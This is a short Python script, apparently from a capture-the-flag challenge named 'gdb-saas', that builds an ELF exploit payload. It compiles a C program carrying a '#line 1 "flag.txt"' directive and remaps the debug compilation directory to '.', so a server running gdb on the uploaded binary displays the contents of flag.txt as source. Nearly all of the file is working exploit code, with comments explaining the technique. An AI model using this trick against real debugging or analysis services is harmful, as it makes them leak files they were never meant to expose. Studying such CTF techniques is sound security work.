#!/usr/bin/env python3
# Build the ELF used for the gdb-saas exploit.
#
# The source begins with the line directive `#line 1 "flag.txt"`, so the
# debug info records the source file as "flag.txt". The compile runs from
# inside a temp build dir, and `-fdebug-prefix-map=<build dir>=.` rewrites
# the recorded compilation directory (DW_AT_comp_dir) to ".". gdb then
# resolves the source file relative to its own current directory - which
# on the server is the directory that also holds flag.txt.
#
# Usage:
#   python3 build_payload.py [output.elf]
import os
import subprocess
import sys
import tempfile

SRC = '''
#line 1 "flag.txt"
int main(void) {
    int x = 1;
    x += 1;
    return x;
}
'''


def main():
    build_dir = tempfile.mkdtemp(prefix='gdb-payload-')
    src = os.path.join(build_dir, 'main.c')
    out = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else 'elf.bin')
    with open(src, 'w') as f:
        f.write(SRC.lstrip('\n'))
    # compile from inside the build dir so DW_AT_comp_dir starts with the
    # build dir; -fdebug-prefix-map then rewrites it to "."
    subprocess.check_call([
        'gcc', '-g', '-O0',
        '-fdebug-prefix-map=' + build_dir + '=.',
        '-o', out, 'main.c',
    ], cwd=build_dir)
    print('payload written to', out)


if __name__ == '__main__':
    main()